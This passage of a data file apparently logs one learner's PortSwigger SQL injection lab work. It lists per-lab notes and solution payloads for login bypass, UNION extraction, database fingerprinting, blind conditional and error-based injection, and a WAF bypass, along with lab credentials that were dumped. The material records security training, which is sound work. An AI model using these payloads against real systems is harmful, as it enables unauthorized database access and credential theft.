        notes: [
          'This lab needs Burp Collaborator for out-of-band interactions, which is a Burp Suite Professional feature.',
          'Parking this until I can justify the licence cost or find a free trial window.',
        ],
        solution:
          'Not attempted - requires Burp Suite Professional (Collaborator/OAST). Revisiting once upgraded.',
        status: 'blocked',
      },
      {
        title: 'Lab 16: Blind SQL injection with out-of-band data exfiltration',
        notes: [
          'Same blocker as Lab 15 - out-of-band exfiltration needs Collaborator, which is Professional-only.',
        ],
        solution:
          'Not attempted - requires Burp Suite Professional (Collaborator/OAST). Revisiting once upgraded.',
        status: 'blocked',
      },
      {
        title: 'Lab 17: SQL injection with filter bypass via XML encoding',
        notes: [
          'Intercepted the "Check Stock" request in Burp, which is where the XML-based injection point lives.',
          'A plain UNION SELECT NULL got blocked immediately with a 403 "Attack detected" response from the filter.',
          'Installed the Hackvertor extension in Burp and encoded the payload with hex_entities, which let the request through with a 200.',
          "Confirmed the injection point with an extra NULL, then used concatenation to get both fields out through the single visible field: UNION SELECT username || '~' || password FROM users.",
        ],
        solution:
          "UNION SELECT username || '~' || password FROM users\n\nCredentials found:\ncarlos~g6eafkale8omhjqkm6o7\nadministrator~ybqknjr1xvaa80bk7trd\nwiener~4hnvro74rym1ileky75x",
        status: 'completed',
      },
    ],
    tools: [
      'Burp Suite',
      'Burp Proxy',
      'Burp Repeater',
      'Hackvertor extension',
    ],
    tags: [
      'SQL injection',
      'error-based SQLi',
      'blind SQLi',
      'time-based blind',
      'WAF bypass',
      'PostgreSQL',
    ],
    link: {
      label: 'SQL injection labs',
      url: 'https://portswigger.net/web-security/sql-injection',
    },
  },
  {
    id: 'portswigger-sqli-labs-11-12',
    date: '2026-07-29',
    category: 'PortSwigger Labs',
    vulnTypes: ['SQL Injection'],
    title: 'SQL Injection labs 11-12 (blind, conditional responses and errors)',
    workedOn: [
      'Completed labs 11 and 12 on the PortSwigger SQL injection path',
      'Worked with blind SQL injection where no data or query error is returned directly to the page',
      'Wrote Python scripts to automate character-by-character password extraction, since Burp Intruder is not available on Community Edition',
    ],
    body: [
      'First real exposure to blind SQLi. Unlike the UNION labs, there is no data reflected on the page at all - the only signal is whether a "Welcome back" message appears or not, so the whole approach shifts to asking the database true/false questions one bit at a time.',
      'Doing this by hand for a 20-character password is not realistic, so this session doubled as an excuse to write my first proper SQLi automation scripts in Python.',
    ],
    labs: [
      {
        title: 'Lab 11: Blind SQL injection with conditional responses',
        notes: [
          "Confirmed the tracking cookie feeds into the query by appending ' and 1=1--' and comparing the response against 1=0.",
          "Confirmed a users table exists with: ' and (select 'x' FROM users LIMIT 1)='x'--",
          "Confirmed the administrator account exists with: ' and (select username FROM users WHERE username='administrator')='administrator'--",
          'Realised that comparing the password directly to a guess would just be brute-forcing the login form through the back door, so length and character enumeration was the way to go.',
          'Narrowed the password length with LENGTH(password)>N checks (true past 6, 10, and 15, false past 20), confirming 20 characters.',
          "Burp Intruder isn't available on Community Edition, so wrote a Python script to automate the substring(password,1,1) character comparisons instead of doing it manually.",
        ],
        solution:
          "' and (select username FROM users WHERE username='administrator' AND LENGTH(password)>N)='administrator'--\n\nExtracted character-by-character via script.\n\nCredentials found:\nadministrator\nkk9s1reehirw9tayifqx",
        status: 'completed',
        script: 'LabScripts/sqli_solver.py',
      },
      {
        title: 'Lab 12: Blind SQL injection with conditional errors',
        notes: [
          'Different flavour of blind SQLi - this one forces a database error instead of a conditional message.',
          "Confirmed Oracle with: TrackingId=...' || (select '' FROM dual) || '",
          "Confirmed the users table exists using rownum so the query doesn't break: ' || (select '' FROM users WHERE rownum=1) || '",
          "Checking WHERE username='administrator' directly always returned 200 regardless of whether it matched, so a conditional error was needed instead.",
          "Built a CASE WHEN that only throws a divide-by-zero error when the condition is true: ' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual) || '",
          'First attempt failed from a missing (1/0) and a stray space in TO_CHAR.',
          "Used the same pattern against the users table to confirm the administrator account and narrow the password length to 20 characters, then scripted the rest since Intruder isn't available on Community Edition.",
        ],
        solution:
          "' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator' AND LENGTH(password)>N) || '\n\nCredentials found:\nadministrator\n1jstrwe8vruggjowu1la",
        status: 'completed',
        script: 'LabScripts/lab12.py',
      },
    ],
    tools: ['Burp Suite', 'Burp Proxy', 'Burp Repeater', 'Python'],
    tags: [
      'SQL injection',
      'blind SQLi',
      'conditional responses',
      'conditional errors',
      'Oracle',
    ],
    link: {
      label: 'SQL injection labs',
      url: 'https://portswigger.net/web-security/sql-injection',
    },
  },
  {
    id: 'portswigger-sqli-labs-1-10',
    date: '2026-07-28',
    category: 'PortSwigger Labs',
    vulnTypes: ['SQL Injection'],
    title: 'SQL Injection labs 1-10 (Burp Suite)',
    workedOn: [
      'Completed labs 1-10 on the PortSwigger SQL injection path',
      'Used Burp Proxy to intercept traffic and Repeater to send payloads',
      'Worked through WHERE clause bypass, login bypass, UNION attacks across Oracle/MySQL/PostgreSQL, data type and column discovery, and dumping credentials',
    ],
    body: [
      'First proper session on the Web Security Academy SQL injection module. Burp Repeater was the main tool once I had a request captured from Proxy.',
      'Main takeaway: comment syntax and version functions change per database (-- vs #, v$version vs @@version vs version()). Getting the column count with ORDER BY (or the UNION SELECT NULL method) and confirming text columns with UNION SELECT came up in almost every lab.',
      "By Lab 10, I'd also picked up the || concatenation trick for squeezing two values (username and password) into a single visible column when the page only renders one field.",
    ],
    labs: [
      {
        title:
          'Lab 1: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data',
        notes: [
          'Vulnerable parameter is the category filter on the product listing page.',
          'Appending a tautology to the WHERE clause returns all rows, including hidden ones.',
        ],
        solution: "GET /filter?category=Gifts' OR '1'='1",
        status: 'completed',
      },
      {
        title: 'Lab 2: SQL injection vulnerability allowing login bypass',
        notes: [
          "Adding a single quote (') caused the page to fail, confirming the input is passed into a SQL query.",
          'Goal was to log in as administrator. Testing username admin with a quote did not work.',
          "The login query looks like: SELECT firstname FROM users WHERE username='...' AND password='...'",
          "Using a comment to skip the password check: administrator'-- with any password value.",
        ],
        solution: "Username: administrator'--  |  Password: (anything)",
        status: 'completed',
      },
      {
        title:
          'Lab 3: SQL injection attack, querying the database type and version on Oracle',
        notes: [
          'Intercepted the category filter request in Burp Proxy and sent it to Repeater.',
          "category=Gifts' ORDER BY 1-- → 200",
          "category=Gifts' ORDER BY 2-- → 200",
          "category=Gifts' ORDER BY 3-- → 500, so 2 columns confirmed.",
          "category=Gifts' UNION SELECT 'a', 'a' FROM DUAL-- → 200. FROM DUAL confirms Oracle.",
        ],
        solution: "' UNION SELECT banner, NULL FROM v$version--",
        status: 'completed',
      },
      {
        title:
          'Lab 4: SQL injection attack, querying database type and version on MySQL and Microsoft',
        notes: [
          'Intercept via Burp, send to Repeater.',
          "category=Accessories' ORDER BY 1-- → 500. Comment syntax -- did not work here.",
          "category=Accessories' ORDER BY 1# → 200. # works as the comment character on this database.",
          'ORDER BY 2# → 200, ORDER BY 3# → 500. Two columns again.',
          'Both columns display text on the page.',
          "category=Accessories' UNION SELECT 'a', 'a'# → 200.",
          'Not Oracle (no FROM DUAL needed). Microsoft/SQL Server uses @@version.',
        ],
        solution: "' UNION SELECT @@version, NULL#",
        status: 'completed',
      },
      {
        title:
          'Lab 5: SQL injection attack, listing the database contents on non-Oracle databases',
        notes: [
          'Intercept and Repeater again on the category filter.',
          'ORDER BY 1-- and ORDER BY 2-- → 200. ORDER BY 3-- → 500. Two columns.',
          "UNION SELECT 'a', 'a'-- → 200. Both columns hold text.",
          '@@version → 500, so not Microsoft SQL Server.',
          'version() → 200, so PostgreSQL.',
          'UNION SELECT table_name, NULL FROM information_schema.tables-- → 200. Found table: users_ocetwc.',
          'First attempt at column lookup returned 500 because I wrote information.schema instead of information_schema.',
          "UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users_ocetwc'-- → username_oslrwn and password_epjcib.",
          'Dumped credentials and logged in as administrator successfully.',
          'Remember the trailing -- on payloads; forgetting it caused a 500 more than once.',
        ],
        solution:
          "' UNION SELECT username_oslrwn, password_epjcib FROM users_ocetwc--\n\nCredentials found:\nadministrator\no0cg3skime8olq3u1au0",
        status: 'completed',
      },
      {
        title:
          'Lab 6: SQL injection attack, listing the database contents on Oracle',
        notes: [
          'Same goal as Lab 5, but adapted for Oracle syntax.',
          "category=Accessories' ORDER BY 1--, ORDER BY 2-- → 200, ORDER BY 3-- → 500. Two columns confirmed.",
          "UNION SELECT 'a', 'a'-- → 500 at first - missing FROM DUAL, which Oracle requires for a UNION with no real table.",
          "UNION SELECT 'a', 'a' FROM DUAL-- → 200, confirming Oracle (the query failing without DUAL was itself a giveaway).",
          'Reused the Lab 3 version query: UNION SELECT banner, NULL FROM v$version--',
          'UNION SELECT table_name, NULL FROM all_tables-- → found table USERS_QAXEJG.',
          "UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name='USERS_QAXEJG'-- → USERNAME_XWMTOF, PASSWORD_QGYRAI.",
          'The PortSwigger cheat sheet was useful here for the Oracle-specific system tables (all_tables, all_tab_columns) instead of information_schema.',
        ],
        solution:
          "' UNION SELECT USERNAME_XWMTOF, PASSWORD_QGYRAI FROM USERS_QAXEJG--\n\nCredentials found:\nadministrator\no3u5naqxsdx95uck2hd8",
        status: 'completed',
      },
      {
        title:
          'Lab 7: SQL injection UNION attack, determining the number of columns returned by the query',
        notes: [
          'Two rules to remember for UNION: the number and order of columns must match across queries, and the data types must be compatible.',
          "Instead of ORDER BY, used ' UNION SELECT NULL-- and kept adding NULLs until the 500 error cleared.",
          "' UNION SELECT NULL, NULL, NULL-- returned 200, confirming three columns.",
        ],
        solution: "' UNION SELECT NULL, NULL, NULL--",
        status: 'completed',
      },
      {
        title:
          'Lab 8: SQL injection UNION attack, finding a column containing text',
        notes: [
          'Confirmed three columns using the NULL method from Lab 7.',
          "Tested each position individually: ' UNION SELECT 'a', NULL, NULL-- then ' UNION SELECT NULL, 'a', NULL--",
          'The second position came back 200, confirming that column accepts text.',
          'Initially used a placeholder value and expected the lab to complete on that alone, but the lab description actually asked for a specific value rather than an arbitrary string.',
          "Adjusted to the exact required value: ' UNION SELECT NULL, '2AxW05', NULL--",
        ],
        solution: "' UNION SELECT NULL, '2AxW05', NULL--",
        status: 'completed',
      },
      {
        title:
          'Lab 9: SQL injection UNION attack, retrieving data from other tables',
        notes: [
          "Confirmed two text columns with the usual ' UNION SELECT 'a', 'a'--",
          "Queried the users table directly: ' UNION SELECT username, password FROM users--",
          'Response was 200 and the credentials appeared directly on the product listing page.',
        ],
        solution:
          "' UNION SELECT username, password FROM users--\n\nCredentials found:\nadministrator\nu7p40o4mwjnw2eo4pb2b",
        status: 'completed',
      },
      {
        title:
          'Lab 10: SQL injection UNION attack, retrieving multiple values in a single column',
        notes: [
          'Confirmed two columns via ORDER BY, but only one column is actually rendered on the page - the other looks like an ID field.',
          "' UNION SELECT NULL, username FROM users-- surfaced all the usernames but not the passwords, and running it twice (once per field) felt clunky.",
          "Used the || concatenation operator to combine both values into the single visible column: ' UNION SELECT NULL, username || password FROM users--",
        ],
        solution: "' UNION SELECT NULL, username || password FROM users--",
        status: 'completed',
        screenshot: 'Burp/Lab10.webp',
      },
    ],
    tools: ['Burp Suite', 'Burp Proxy', 'Burp Repeater'],
    tags: [
      'SQL injection',
      'UNION attacks',
      'Oracle',
      'MySQL',
      'PostgreSQL',
      'login bypass',
    ],
    link: {
      label: 'SQL injection labs',
      url: 'https://portswigger.net/web-security/sql-injection',
    },
  },
]
